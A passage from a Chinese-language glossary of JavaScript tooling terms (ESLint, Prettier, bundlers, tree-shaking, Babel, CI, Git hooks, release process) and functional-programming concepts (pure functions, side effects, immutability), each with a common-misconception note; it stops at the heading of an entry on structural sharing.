linter（以 ESLint 为代表）是**静态分析工具**：它不执行代码，而是把源码解析成抽象语法树（AST），再让一条条「规则」去检查这棵树。它专治「JS 这门语言允许、但几乎一定是写错了」的那类问题：拼错的变量名、忘了 `await` 的 Promise、`==` 带来的隐式转换、声明了却没用过的变量、不可达代码、误用 `this`。因为是在**运行前**发现，它比等测试或线上报错要便宜得多，而且能给出统一的修复建议。

**常见误解**：以为 linter 能替代测试或类型检查。它只做**语法和模式**层面的检查，不理解业务语义；`const x = await fetchUser()` 里 `x` 是不是真的用户对象，linter 无从判断。

也见 [Formatter（代码格式化器）](#formatter代码格式化器)、[ESLint Rule（ESLint 规则）](#eslint-ruleeslint-规则)、[Severity（严重度）](#severity严重度)。

示例：[`39_tooling_and_workflow/04_eslint.js`](39_tooling_and_workflow/04_eslint.js)

### Formatter（代码格式化器）

formatter（以 Prettier 为代表）是**只负责排版、不管逻辑**的工具：把源码交给它，它按一套固定规则重新打印一遍，决定「这行该不该换行、缩进几个空格、用单引号还是双引号、末尾要不要逗号」。它的关键特征是**固执己见（opinionated）且几乎不可配置**——这种限制是刻意的：目标不是让你配出理想风格，而是让**所有人不再讨论风格**。它完全理解不了你的业务逻辑，也不判断对错。

**常见误解**：把 Prettier 和 ESLint 混为一谈，或者在 ESLint 里装一堆格式化类规则。正确分工是：**Prettier 管排版（可自动改且无争议），ESLint 管正确性与代码质量（改法有争议或需人判断）**。为此 ESLint 提供了 `eslint-config-prettier` 来关掉所有与 Prettier 冲突的格式规则。

也见 [Linter（代码检查器）](#linter代码检查器)、[Flat Config（平面配置）](#flat-config平面配置)。

示例：[`39_tooling_and_workflow/05_prettier.js`](39_tooling_and_workflow/05_prettier.js)、[`39_tooling_and_workflow/08_code_quality_workflow.js`](39_tooling_and_workflow/08_code_quality_workflow.js)

### ESLint Rule（ESLint 规则）

规则是 ESLint 的最小检查单元：每条规则负责一个具体判断（如 `no-unused-vars` 找未使用变量、`eqeqeq` 禁止 `==`、`no-floating-promises` 要求处理 Promise），并可以被单独配置严重度和参数。规则有三种来源：ESLint 内置、插件提供（如 `eslint-plugin-react`、`@typescript-eslint`）、以及项目自己写的自定义规则。开规则有三种粒度：`extends` 继承一份预设（如 `eslint:recommended`）、`plugins` 引入插件、`rules` 逐条微调。真实项目的做法通常是「继承两三份预设 + 关掉几条不合适的 + 打开几条团队特有的」。

**常见误解**：以为预设开得越多越好。规则不是越多越安全，噪音大的规则（例如把 `console.log` 一律报错）会让团队养成「无脑 `--fix` 或加 ignore」的习惯，反而让真正的问题被淹没。

也见 [Severity（严重度）](#severity严重度)、[--fix（自动修复）](#--fix自动修复)、[Flat Config（平面配置）](#flat-config平面配置)。

示例：[`39_tooling_and_workflow/04_eslint.js`](39_tooling_and_workflow/04_eslint.js)

### Severity（严重度）

ESLint 每条规则可以配三种严重度：`off`（0，关闭）、`warn`（1，警告——不影响退出码，只提示）、`error`（2，错误——会让 `eslint` 命令以非零码退出，从而让 CI 失败）。这个三档设计是**渐进式落地**的关键：接手一个老项目时，先把所有规则设为 `warn` 跑通，再逐条改成 `error`，而不是一次性开满导致 CI 全红。另外很多规则支持传入额外选项，写法是数组 `['error', { ... }]`。

**常见误解**：以为 `warn` 和 `error` 只是显示颜色不同。真正的区别在**退出码**：CI 只认退出码，因此只有 `error` 才能形成硬性门禁——把关键规则设在 `warn` 等于没设。

也见 [ESLint Rule（ESLint 规则）](#eslint-ruleeslint-规则)、[Test Gate（测试门禁）](#test-gate测试门禁)。

示例：[`39_tooling_and_workflow/04_eslint.js`](39_tooling_and_workflow/04_eslint.js)

### --fix（自动修复）

ESLint 的 `--fix` 参数会尝试自动修复「可以安全修复」的规则违规（如多余的引号、缺的分号、可以改成 `const` 的 `let`），修完把剩余无法自动修复的问题打印出来。可自动修复的规则在文档里标有小扳手图标。使用姿势有两种：一次性全量跑 `eslint . --fix`，或在编辑器里保存时自动修复（`editor.codeActionsOnSave`）。注意 Prettier 也有 `--write`，两者在保存时通常一起触发。

**常见误解**：以为 `--fix` 能修所有问题。需要理解语义才能修的（未使用变量要不要删、`==` 改成 `===` 会不会改变行为）一律不自动修；另外 `--fix` **会改动源文件**，在 CI 里应该用 `--max-warnings 0` 做检查而不是 `--fix`，否则相当于在 CI 里改代码。

也见 [ESLint Rule（ESLint 规则）](#eslint-ruleeslint-规则)、[Formatter（代码格式化器）](#formatter代码格式化器)。

示例：[`39_tooling_and_workflow/04_eslint.js`](39_tooling_and_workflow/04_eslint.js)

### Flat Config（平面配置）

Flat config 是 ESLint 从 v9 起的默认配置格式，配置文件名为 `eslint.config.js`，导出一个**数组**。它取代了旧的 `.eslintrc.*`（eslintrc 体系），核心变化有三：① 配置从「层级继承 + 就近覆盖」变成**一个扁平数组**，`files` 匹配哪些文件、其余键就是该文件的配置；② `plugins` 从字符串名字（需要靠命名约定解析）变成**直接导入的对象**，因此不需要再关心 `eslint-plugin-` 前缀；③ 每一项可以用 `ignores` 表示忽略，也可以用 `extends`（v9.15+）复用现成预设。数组的顺序就是优先级——后面的项覆盖前面的。

**常见误解**：把旧的 `.eslintrc.json` 里的 `extends`/`overrides` 直接搬进 flat config。结构完全不同，必须重写；项目里如果同时存在两种配置文件，行为会非常难以预料。

也见 [ESLint Rule（ESLint 规则）](#eslint-ruleeslint-规则)、[Linter（代码检查器）](#linter代码检查器)。

示例：[`39_tooling_and_workflow/04_eslint.js`](39_tooling_and_workflow/04_eslint.js)、[`39_tooling_and_workflow/08_code_quality_workflow.js`](39_tooling_and_workflow/08_code_quality_workflow.js)

### Bundler（打包器）

bundler（webpack、Rollup、esbuild、Vite、Rspack 等）把成百上千个源码模块**合并成浏览器能直接加载的少数几个文件**。它从**入口**出发，沿 `import`/`require` 递归解析，构建出**依赖图**，然后按图生成产物，顺便完成转译、压缩、资源处理（CSS/图片）等工作。为什么浏览器早已原生支持 `import` 还要打包？三个现实原因：**请求瀑布**（200 个模块意味着 200 次请求）、**裸模块说明符无法直接加载**（浏览器不认识 `import x from 'lodash'`）、以及**产物优化**（tree-shaking、压缩、代码分割）只有拿到全图才能做。

**常见误解**：以为「打包 = 转译」。这是两件事：打包关心**文件怎么组合**，转译关心**语法怎么写**；只是现代工具链常常一起做。

也见 [Entry Point（入口）](#entry-point入口)、[Dependency Graph（依赖图）](#dependency-graph依赖图)、[Transpile（转译）](#transpile转译)。

示例：[`39_tooling_and_workflow/06_bundlers_and_transpiling.js`](39_tooling_and_workflow/06_bundlers_and_transpiling.js)

### Entry Point（入口）

入口是打包器**开始遍历依赖图的起点**，通常配置成 `src/index.js`、`src/main.js` 或一个由 HTML 引用的脚本。入口决定了「什么会被打进产物」：从入口可达的模块才会进入依赖图，不可达的模块直接被丢掉——这正是 tree-shaking 的基础。多入口（数组或对象）会产出多份产物，用于「一个站点多个独立页面」的场景；入口也可以配成对象来给每个 chunk 命名。库作者打包时还要注意 `externals`（把 `react` 等留给使用者提供，不要打进去）。

**常见误解**：以为入口是「代码执行的第一行」。它是**静态分析的起点**；真正的执行顺序由运行时按导入顺序决定，两者不一定一致。

也见 [Bundler（打包器）](#bundler打包器)、[Dependency Graph（依赖图）](#dependency-graph依赖图)。

示例：[`39_tooling_and_workflow/06_bundlers_and_transpiling.js`](39_tooling_and_workflow/06_bundlers_and_transpiling.js)

### Dependency Graph（依赖图）

依赖图是打包器对项目内部 `import`/`require` 关系建模得到的**有向图**：每个模块是一个顶点，每条导入是一条有向边。它必然是**有向无环图**（DAG）——出现环意味着循环依赖，打包器要么报错要么按某种顺序打破它。有了全图，工具才能做后续的一切：确定打包顺序、识别哪些模块是重复的（去重）、哪些导出从未被使用（tree-shaking）、哪些模块可以拆成独立 chunk（代码分割）。所以「打包慢」通常不是压缩慢，而是**构建这张图慢**（文件 IO + 解析）。

**常见误解**：以为依赖图只包含 `import` 语句。动态 `import()`、`require` 表达式、甚至 CSS 和图片的引用都会成为边，这也是为什么一个看似无关的文件改动会让整个产物哈希变化。

也见 [Bundler（打包器）](#bundler打包器)、[Tree-shaking（tree-shaking）](#tree-shakingtree-shaking)。

示例：[`39_tooling_and_workflow/06_bundlers_and_transpiling.js`](39_tooling_and_workflow/06_bundlers_and_transpiling.js)

### Tree-shaking（tree-shaking）

tree-shaking 是打包器的**死代码消除**能力：既然拿到了完整依赖图，就能判断某个导出是否真的被任何地方使用，未被使用的就不写进产物。它得名的比喻是「摇树，让枯叶掉下来」。能生效有三个前提：① 用**静态的 ESM `import`/`export`**（CommonJS 的 `require` 是运行时求值，无法静态分析，所以 CJS 包基本摇不动）；② 打包器能确定模块**没有副作用**；③ 代码不要写成「把整个库挂到对象上再动态取」的形式。副作用声明见 `sideEffects` 字段。

**常见误解**：以为只要用 ESM 写就一定能把没用的代码摇掉。`import './polyfill'` 这种**只导入不绑定**的写法、以及顶层执行的表达式，都会被保守地保留。

也见 [sideEffects（副作用标记）](#sideeffects副作用标记)、[Bundler（打包器）](#bundler打包器)。

示例：[`39_tooling_and_workflow/06_bundlers_and_transpiling.js`](39_tooling_and_workflow/06_bundlers_and_transpiling.js)

### sideEffects（副作用标记）

`sideEffects` 是 `package.json` 里给打包器看的**提示字段**，用来告诉它「这个包的模块在被导入时会不会产生副作用」。默认（不写）是「可能有」，打包器就会保守地把整个模块保留；写 `"sideEffects": false` 表示「本包里所有的模块导入都纯粹是定义，删掉没用的不会改变行为」，从而允许 tree-shaking 大胆剪枝；也可以给数组精确豁免：`"sideEffects": ["*.css", "./src/polyfill.js"]`。之所以需要它，是因为打包器无法自动判断「一个被 import 却没被使用的模块」，到底是纯粹没用到，还是它的顶层代码在做注册/补丁这类必须保留的事。

**常见误解**：把它当成「性能开关」随意设为 `false`。如果你的包有 `import './patch-something'` 这种写法，声明 `false` 会让打包器把它删掉，使用者的运行时行为随之改变——这是一个**语义声明**，必须准确。

也见 [Tree-shaking（tree-shaking）](#tree-shakingtree-shaking)、[package.json（package.json 清单文件）](#packagejsonpackagejson-清单文件)。

示例：[`39_tooling_and_workflow/06_bundlers_and_transpiling.js`](39_tooling_and_workflow/06_bundlers_and_transpiling.js)、[`39_tooling_and_workflow/01_package_json_guide.js`](39_tooling_and_workflow/01_package_json_guide.js)

### Code Splitting（代码分割）

代码分割把产物**拆成多个文件（chunk）**而不是一个大 bundle，从而让首屏只加载必需的代码。三种做法：**多入口**（天然多个 chunk）、**动态 `import()`**（在代码执行到那行时才去下载对应 chunk，是主流方式）、以及**基于路由/组件的自动分割**（框架如 Vite/Next 的路由级分割）。打包器还会自动抽出被多个 chunk 共享的模块成为公共 chunk（`splitChunks` / `manualChunks`），避免重复下载。它的收益是首屏 JS 体积下降，代价是请求数增加、需要处理加载中状态和失败重试。

**常见误解**：以为分割得越细越好。每个 chunk 都是一个 HTTP 请求和一段解析开销，过度切割（比如每个组件一个 chunk）会让「按需加载」的总代价反而超过一次性加载。

也见 [Lazy Loading（懒加载）](#lazy-loading懒加载)、[Bundler（打包器）](#bundler打包器)。

示例：[`39_tooling_and_workflow/06_bundlers_and_transpiling.js`](39_tooling_and_workflow/06_bundlers_and_transpiling.js)

### Lazy Loading（懒加载）

懒加载指「**用到时才加载**」，在 JS 里的标准写法是动态 `import()`：它返回一个 Promise，解析出模块命名空间对象，例如 `const { renderChart } = await import('./chart.js')`。它和代码分割是**因果配对**：`import()` 是「因」（告诉打包器这里是分割点），代码分割是「果」（打包器据此生成独立 chunk），运行时再由浏览器按需拉取。典型用法：路由切换时加载页面、点开弹窗时才加载重量级编辑器、浏览器空闲时才加载埋点 SDK。要把加载中、加载失败的状态交给 UI 处理。

**常见误解**：以为动态 `import()` 和静态 `import` 只是写法差别。动态导入的模块**不是**在文件顶部就绪的，任何假设它同步可用的代码都会拿到 `undefined`；此外它也无法被 tree-shaking 充分优化。

也见 [Code Splitting（代码分割）](#code-splitting代码分割)、[Bundler（打包器）](#bundler打包器)。

示例：[`39_tooling_and_workflow/06_bundlers_and_transpiling.js`](39_tooling_and_workflow/06_bundlers_and_transpiling.js)、[`19_modules/09_dynamic_import.js`](19_modules/09_dynamic_import.js)

### Transpile（转译）

转译（transpiling）是把**一种语言的源码改写成另一种（通常是同族但更旧的）语法**，让老环境也能跑新语法。它做的是语法层面的等价变换：箭头函数 → `function`、可选链 `a?.b` → 三元表达式、`async/await` → generator + Promise 状态机、类字段 → 构造函数里的赋值。它**不做**类型检查（那是 TypeScript 的 `tsc --noEmit` 或类型感知检查的职责），也**不做** polyfill（新 API 如 `Array.prototype.at` 需要引入运行时垫片，语法糖转译不出来）。

**常见误解**：以为「转译了就能在 IE 跑」。转译只解决**语法**，不解决**内建对象和 API**；`Promise`、`fetch`、`Object.fromEntries` 这类缺失仍然是运行时错误，必须靠 polyfill。

也见 [Babel（Babel）](#babelbabel)、[Target Environment（目标环境）](#target-environment目标环境)。

示例：[`39_tooling_and_workflow/06_bundlers_and_transpiling.js`](39_tooling_and_workflow/06_bundlers_and_transpiling.js)

### Babel（Babel）

Babel 是 JS 生态最主流的转译器，工作方式是把源码解析成 AST，再让一系列**插件（plugin）**逐个改写 AST，最后生成代码——所以「Babel 能干什么」完全取决于装了哪些插件。实际使用时用**预设（preset）**成组引入：`@babel/preset-env` 按目标环境自动决定需要哪些语法转换插件，`@babel/preset-react` 处理 JSX，`@babel/preset-typescript` 只剥掉类型注解（不做类型检查）。它还可以通过 `@babel/plugin-transform-runtime` 复用辅助代码而不是每个文件内联一份，减小体积。

**常见误解**：以为 Babel 会做类型检查。`@babel/preset-typescript` 只负责「把类型擦掉让代码能跑」，类型错误的发现必须交给 `tsc`——这也是「Babel 编译通过但类型是错的」这一常见困惑的来源。

也见 [Transpile（转译）](#transpile转译)、[Target Environment（目标环境）](#target-environment目标环境)、[browserslist（browserslist）](#browserslistbrowserslist)。

示例：[`39_tooling_and_workflow/06_bundlers_and_transpiling.js`](39_tooling_and_workflow/06_bundlers_and_transpiling.js)

### Target Environment（目标环境）

目标环境是「你希望产物能跑在哪些运行环境上」的声明，它直接决定转译和 polyfill 的力度：目标定得越旧，需要转换的语法越多、产物越大、运行越慢。它通常不写在 Babel 配置里，而是由 `browserslist` 字段（或 `.browserslistrc`）统一提供，被 Babel、PostCSS、autoprefixer、esbuild 等工具共同读取。此外还有 **`engines`** 字段描述 Node 侧的目标版本——两件事要分清：`browserslist` 面向浏览器（打包产物用），`engines` 面向 Node（npm 包或服务端用）。

**常见误解**：把目标环境当成「越兼容越好」。为了 0.1% 的老浏览器把全站代码降级，会让 99.9% 的用户下载更大更慢的包——目标环境是一个**产品决策**，通常根据真实埋点数据划定。

也见 [browserslist（browserslist）](#browserslistbrowserslist)、[Babel（Babel）](#babelbabel)、[Transpile（转译）](#transpile转译)。

示例：[`39_tooling_and_workflow/06_bundlers_and_transpiling.js`](39_tooling_and_workflow/06_bundlers_and_transpiling.js)

### browserslist（browserslist）

`browserslist` 是一个**共享的目标环境查询语言**，写在 `package.json` 的 `browserslist` 字段或根目录的 `.browserslistrc` 里，用查询串描述你支持哪些浏览器，例如 `"last 2 versions"`、`"> 0.5%"`、`"not dead"`、`"defaults"`。它本身不做任何转换，而是被 Babel、autoprefixer、PostCSS、esbuild 等一大批工具读取，从而让整条工具链的目标环境保持一致。工程价值在于**单一事实来源**：改一行配置，所有工具的兼容范围一起变。可以用 `npx browserslist` 查看当前查询实际命中了哪些浏览器。

**常见误解**：以为它是个打包工具或 Babel 插件。它只是一个查询库；另外注意查询结果是**随时间变化**的（`last 2 versions` 今天和明年命中的版本不同），所以它和可复现构建有一点天然张力。

也见 [Target Environment（目标环境）](#target-environment目标环境)、[Babel（Babel）](#babelbabel)。

示例：[`39_tooling_and_workflow/06_bundlers_and_transpiling.js`](39_tooling_and_workflow/06_bundlers_and_transpiling.js)

### Build Artifact（构建产物）

构建产物是构建流程的输出：一个 `dist/` 或 `build/` 目录，里面是压缩后的 JS/CSS、静态资源、以及 source map。它有三个重要性质：**它不该进版本库**（应写进 `.gitignore`，因为它是可再生的，提交它会造成冲突和无意义的 diff）；**它是发布的对象**（`npm publish` 的 `files` 白名单、部署脚本、Docker 镜像都从它取件）；**它需要命名缓存策略**（带内容哈希的文件名如 `main.a1b2c3.js` 才能让浏览器长期缓存，HTML 引用最新哈希实现「更新即换名」）。

**常见误解**：把源码和产物搞混，或者为了让 CI 快一点而提交 `dist/`。看似省事，实际上会引入「有人改了源码忘了重新构建」的幽灵 bug，而且让 PR diff 淹没在几十万行生成代码里。

也见 [Bundler（打包器）](#bundler打包器)、[Release Process（发布流程）](#release-process发布流程)。

示例：[`39_tooling_and_workflow/08_code_quality_workflow.js`](39_tooling_and_workflow/08_code_quality_workflow.js)、[`39_tooling_and_workflow/02_npm_scripts_and_lifecycle.js`](39_tooling_and_workflow/02_npm_scripts_and_lifecycle.js)

### Continuous Integration（持续集成）

持续集成（CI，Continuous Integration）指「每次推送代码后，由服务器自动执行一套校验流水线」，用机器代替人去确认「这份代码是好的」。典型任务序列是 `npm ci → lint → typecheck → test → build`，任何一步失败就在 PR 上给出明确的红叉。它的核心收益不是「跑得快」，而是**反馈前置**：把「合并后才发现坏了」变成「合并前就知道坏了」，配合分支保护规则，坏代码根本进不了主干。常见平台：GitHub Actions、GitLab CI、CircleCI、Jenkins。

**常见误解**：以为 CI 就是「自动跑测试」。跑测试只是其中一环；更大的价值在于**环境一致性**——CI 每次都从零安装依赖，因此能暴露「依赖我本机全局装的某个包」这类隐藏问题。

也见 [Pipeline（流水线）](#pipeline流水线)、[npm ci（npm ci）](#npm-cinpm-ci)、[Test Gate（测试门禁）](#test-gate测试门禁)。

示例：[`39_tooling_and_workflow/07_lockfile_and_ci.js`](39_tooling_and_workflow/07_lockfile_and_ci.js)

### Pipeline（流水线）

流水线（pipeline）是 CI 里对「按顺序、分阶段执行的任务序列」的称呼，通常用声明式配置（如 GitHub Actions 的 YAML）描述。它的两个基本概念：**stage / job**（一个阶段，如 lint、test、build）和**step**（阶段内的一步命令）。流水线设计的关键是**并行与缓存**：互不依赖的 job 并行跑（lint 和 test 可以同时开始），`node_modules` 和构建缓存跨运行复用可以把几分钟压到几秒——但缓存必须用锁文件的哈希做 key，否则会用上过期依赖。质量工作流正是「本地毫秒级 → 提交前秒级 → CI 分钟级」这条分层的流水线。

**常见误解**：以为流水线越长越严格就越专业。每一步都要付出等待成本和维护成本；实践中遵循「快检查放前面、慢检查放后面」的排序原则（lint 几秒就失败，不该排在五分钟的测试后面）。

也见 [Continuous Integration（持续集成）](#continuous-integration持续集成)、[Git Hooks（Git 钩子）](#git-hooksgit-钩子)。

示例：[`39_tooling_and_workflow/08_code_quality_workflow.js`](39_tooling_and_workflow/08_code_quality_workflow.js)、[`39_tooling_and_workflow/07_lockfile_and_ci.js`](39_tooling_and_workflow/07_lockfile_and_ci.js)

### Git Hooks（Git 钩子）

Git 钩子是 Git 在特定事件前后自动执行的脚本，放在 `.git/hooks/` 目录下（如 `pre-commit`、`commit-msg`、`pre-push`、`post-merge`）。**关键坑**：`.git/hooks/` **不进版本库**，直接在里面写脚本无法分享给团队。因此实践中用 **Husky** 这类工具：它把钩子安装动作挂到 `prepare` 生命周期脚本上，于是任何人 `npm install` 之后钩子自动就位，钩子脚本本体则作为普通文件提交进仓库。常见的钩子用途：提交前跑 lint-staged、提交信息校验（commitlint）、推送前跑完整测试。

**常见误解**：以为钩子是「强制」的。任何人都能 `git commit --no-verify` 绕过本地钩子，所以钩子的定位是**快速反馈**，真正的门禁必须放在 CI 上——两处都要有，各司其职。

也见 [pre-commit（pre-commit 钩子）](#pre-commitpre-commit-钩子)、[lint-staged（lint-staged）](#lint-stagedlint-staged)。

示例：[`39_tooling_and_workflow/07_lockfile_and_ci.js`](39_tooling_and_workflow/07_lockfile_and_ci.js)、[`39_tooling_and_workflow/08_code_quality_workflow.js`](39_tooling_and_workflow/08_code_quality_workflow.js)

### pre-commit（pre-commit 钩子）

`pre-commit` 是**在提交真正生成之前**触发的钩子，它的杀手级能力是：**只要脚本以非零状态退出，提交就被取消**。这使它成为「不让坏代码进历史」的第一道闸门。典型配置是在这里对**暂存区的文件**跑 lint、format 和受影响测试。设计要点：必须足够快（目标 1~3 秒），否则开发者会用 `--no-verify` 把它绕过去，钩子就形同虚设；因此这里只跑「对被改文件」的增量检查，全量检查留给 CI。

**常见误解**：在 pre-commit 里跑全量测试或全量构建。几十秒的等待会立刻让人养成绕过钩子的习惯，结果是「有钩子但没人用」，比没有钩子更糟。

也见 [Git Hooks（Git 钩子）](#git-hooksgit-钩子)、[lint-staged（lint-staged）](#lint-stagedlint-staged)。

示例：[`39_tooling_and_workflow/07_lockfile_and_ci.js`](39_tooling_and_workflow/07_lockfile_and_ci.js)、[`39_tooling_and_workflow/08_code_quality_workflow.js`](39_tooling_and_workflow/08_code_quality_workflow.js)

### lint-staged（lint-staged）

lint-staged 解决 pre-commit 里最实际的问题：**只对本次暂存（staged）的文件跑检查**。它自己读取 `git diff --cached --name-only`，按 glob 匹配分组，然后对每组执行配置的命令，并把**自动修复后的结果重新 `git add`** 回暂存区。配置形如 `{ "*.js": ["eslint --fix", "prettier --write"] }`。它与 Husky 是标准搭档：Husky 负责「什么时候跑」，lint-staged 负责「对哪些文件跑、跑完怎么回写」。

**常见误解**：以为 lint-staged 能提升检查速度的「算法」。它省时间靠的是**缩小输入范围**（只查改动文件），而不是更快的引擎；因此它**不能替代 CI 的全量检查**——一个文件单独看没问题，和别的改动合在一起仍可能出问题。

也见 [pre-commit（pre-commit 钩子）](#pre-commitpre-commit-钩子)、[ESLint Rule（ESLint 规则）](#eslint-ruleeslint-规则)。

示例：[`39_tooling_and_workflow/08_code_quality_workflow.js`](39_tooling_and_workflow/08_code_quality_workflow.js)、[`39_tooling_and_workflow/07_lockfile_and_ci.js`](39_tooling_and_workflow/07_lockfile_and_ci.js)

### Test Gate（测试门禁）

测试门禁指「把某类检查设为合并/发布的**硬性前置条件**」，不通过就不允许继续。它由三层共同实现：**本地**（编辑器提示、pre-commit 钩子）负责快速反馈；**CI**（`npm ci → lint → typecheck → test → build` 任一步非零退出即失败）负责权威判定；**平台分支保护规则**（required status checks、必需 review、禁止直推主干）负责让 CI 的失败真正产生阻断力。设计门禁的核心是**严重度分层**：什么级别的问题允许合并（warn）、什么绝不允许（error），以及是否要求覆盖率不下降。

**常见误解**：以为「CI 红了但可以手动 merge」是可接受的例外。门禁一旦被绕过就成了摆设；如果某条规则经常被绕过，正确做法是**降低它的严重度或删掉它**，而不是保留一条人人无视的红线。

也见 [Continuous Integration（持续集成）](#continuous-integration持续集成)、[Severity（严重度）](#severity严重度)、[Pipeline（流水线）](#pipeline流水线)。

示例：[`39_tooling_and_workflow/08_code_quality_workflow.js`](39_tooling_and_workflow/08_code_quality_workflow.js)

### Release Process（发布流程）

发布流程是「从代码合并到用户可用」这条链路的规范化：常见步骤是改版本号（或由 changesets 根据变更描述自动计算）→ 更新 CHANGELOG → 打 tag（如 `v1.4.0`）→ 触发 `npm publish` 或部署流水线 → 由 tag 上的钩子执行发布。配套的工程约束包括：发布必须从 CI 而非个人电脑执行（保证可复现、有审计记录），发布前必须跑全量测试（`prepublishOnly`），以及用 `npm publish --dry-run` 先预览会被打包哪些文件。版本号怎么涨由[语义化版本](#semantic-versioning语义化版本)决定。

**常见误解**：以为 `npm publish` 是个可以随手执行、出问题再 `unpublish` 的命令。npm 对已发布版本的撤销有严格限制（24 小时后基本无法撤回），而且一旦有项目依赖了它，撤销会直接破坏别人的构建——**发布是不可逆操作**。

也见 [Semantic Versioning（语义化版本）](#semantic-versioning语义化版本)、[Lifecycle Scripts（生命周期脚本）](#lifecycle-scripts生命周期脚本)、[Build Artifact（构建产物）](#build-artifact构建产物)。

示例：[`39_tooling_and_workflow/08_code_quality_workflow.js`](39_tooling_and_workflow/08_code_quality_workflow.js)、[`39_tooling_and_workflow/02_npm_scripts_and_lifecycle.js`](39_tooling_and_workflow/02_npm_scripts_and_lifecycle.js)

## 函数式编程

### Functional Programming（函数式编程）

函数式编程（FP，Functional Programming）是一种以**函数组合**为主要组织手段的编程范式，它的三条支柱是：**纯函数**（同样输入永远同样输出、无副作用）、**不可变数据**（不修改已有值，而是产生新值）、**函数是一等公民**（能当参数传、当返回值返回、存进变量）。它带来的实际收益不是「优雅」，而是**可推理性**：纯函数可以独立测试、可以安全缓存（memoize）、可以并行执行而不担心竞争、可以放心重构。JS 不是纯函数式语言，但它把 FP 需要的语言设施都配齐了（闭包、箭头函数、`map`/`filter`/`reduce`、展开语法），因此在工程里可以按需取用。

**常见误解**：以为 FP 要求「完全不用可变状态」或「必须用某个库」。真实项目里 FP 是**倾向性**的：把核心业务逻辑写成纯函数，把副作用挤到边界层，这个「函数式核心 + 命令式外壳」的混合做法才是最实用的形态。

也见 [Pure Function（纯函数）](#pure-function纯函数)、[Immutability（不可变性）](#immutability不可变性)、[Declarative and Imperative（声明式与命令式）](#declarative-and-imperative声明式与命令式)。

示例：[`40_functional_programming/01_functor.js`](40_functional_programming/01_functor.js)、[`06_functions/11_pure_functions.js`](06_functions/11_pure_functions.js)

### Pure Function（纯函数）

纯函数满足两个条件：**相同输入永远得到相同输出**（不依赖时间、随机数、外部变量等可变状态），并且**不产生可观察的副作用**（不修改参数、不改全局、不写文件、不发请求、不打印）。第二个条件里最容易被忽略的是「不修改入参」——一个函数如果 `push` 了传进来的数组，它就不是纯的，因为调用方观察到了变化。纯函数的回报很直接：可以独立单元测试（不用 mock）、可以自由缓存（[Memoization（备忘录法）](#memoization备忘录法)）、可以任意重排和并行、出 bug 时只需要看函数体。

**常见误解**：以为「没有副作用」就等于「函数体内不能出现 `console.log`」。严格来说打印也是副作用，但工程上通常关心的是**会影响程序行为**的副作用；调试日志一般被宽容对待，关键是别让它成为逻辑的一部分。

也见 [Side Effect（副作用）](#side-effect副作用)、[Referential Transparency（引用透明）](#referential-transparency引用透明)。

示例：[`06_functions/11_pure_functions.js`](06_functions/11_pure_functions.js)、[`40_functional_programming/01_functor.js`](40_functional_programming/01_functor.js)

### Side Effect（副作用）

副作用是函数除了「返回值」之外**对外部世界造成的任何可观察影响**：改全局变量、修改入参、写 DOM、发网络请求、读写文件、打日志、改数据库、`Date.now()` / `Math.random()` 这类「读取环境」。注意最后这类是**读取**而非写入，但同样算副作用，因为它们让输出不再只由参数决定。FP 的立场不是「消灭副作用」（程序终究要影响世界），而是**隔离副作用**：让纯函数负责计算，把副作用推到程序的边界，并用容器（如 IO 函子）把它显式地表达出来。

**常见误解**：以为「不写文件、不请求」就没有副作用。修改一个传进来的对象是最常见也最隐蔽的副作用，它会让「我明明没改这个数组」变成排查半天的 bug。

也见 [Pure Function（纯函数）](#pure-function纯函数)、[Side-effect Isolation（副作用隔离）](#side-effect-isolation副作用隔离)、[IO Functor（IO函子）](#io-functorio函子)。

示例：[`06_functions/11_pure_functions.js`](06_functions/11_pure_functions.js)、[`40_functional_programming/03_either.js`](40_functional_programming/03_either.js)

### Referential Transparency（引用透明）

引用透明指「一个表达式可以被它的**结果值**替换，而程序行为不变」。它是纯函数带来的直接推论，也是 FP 里做等式推理的基础：既然 `add(1, 2)` 永远等于 `3`，那代码里任何地方都可以放心地把前者换成后者。实际价值体现在三处：**缓存**（结果可替换才谈得上记忆化）、**惰性求值**（不求值也不影响结果，才能推迟到需要时）、**并行**（可任意重排而不改变语义）。反过来，`Date.now()` 就没有引用透明性——把它换成某个具体数字会改变程序行为。

**常见误解**：把引用透明和「函数是纯的」当成同一件事。两者等价性很高（纯函数构成的表达式引用透明），但「引用透明」描述的是**表达式**的性质，「纯」描述的是**函数**的性质。

也见 [Pure Function（纯函数）](#pure-function纯函数)、[Lazy Evaluation（惰性求值）](#lazy-evaluation惰性求值)。

示例：[`06_functions/11_pure_functions.js`](06_functions/11_pure_functions.js)

### Immutability（不可变性）

不可变性指「一个值创建之后就不再改变」——要「改」就基于原值创建一个新值。在 JS 里，`const` 只保证**绑定**不可变，不保证**对象内容**不可变，所以真正的手段有：`Object.freeze`（浅冻结）、展开语法 `{ ...obj, key: newValue }`、数组的 `toSorted`/`toReversed`/`toSpliced`/`with`（ES2023 新增的不可变版本）、`structuredClone`（深拷贝）。不可变性的收益是：共享引用不再有「谁改的」问题、变更可追溯（每次都是新对象，利于 diff 和撤销）、以及让 React 等框架能靠引用比较判断是否需要重新渲染。

**常见误解**：以为不可变就是「性能差」。朴素的全量深拷贝确实贵，但真正的实现靠的是[结构共享](#structural-sharing结构共享)——只复制路径上的节点，其余部分复用引用，因此代价是 O(log n) 而非 O(n)。

也见 [Persistent Data Structure（持久化数据结构）](#persistent-data-structure持久化数据结构)、[Structural Sharing（结构共享）](#structural-sharing结构共享)。

示例：[`40_functional_programming/01_functor.js`](40_functional_programming/01_functor.js)、[`09_objects/09_freeze_seal.js`](09_objects/09_freeze_seal.js)

### Persistent Data Structure（持久化数据结构）

这里的「持久化」不是「存到磁盘」，而是指**旧版本在修改后依然可用**：对一个持久化数据结构做「修改」，会返回一个新版本，原版本保持不变，两个版本可以同时存在。这正是不可变数据在实现层面需要的性质。它和「临时性（ephemeral）数据结构」相对——后者的修改会就地改变原对象。持久化结构让「撤销/重做」「时间旅行调试」「并发快照」变得廉价：保留一堆历史版本只是一堆指针而已。

**常见误解**：把「持久化」理解成 `localStorage` 或数据库那层含义。在这个术语里，它描述的是**数据结构的版本语义**，与存储介质毫无关系。

也见 [Structural Sharing（结构共享）](#structural-sharing结构共享)、[Immutability（不可变性）](#immutability不可变性)。

示例：[`40_functional_programming/01_functor.js`](40_functional_programming/01_functor.js)、[`40_functional_programming/06_adt_and_pattern_matching.js`](40_functional_programming/06_adt_and_pattern_matching.js)

### Structural Sharing（结构共享）

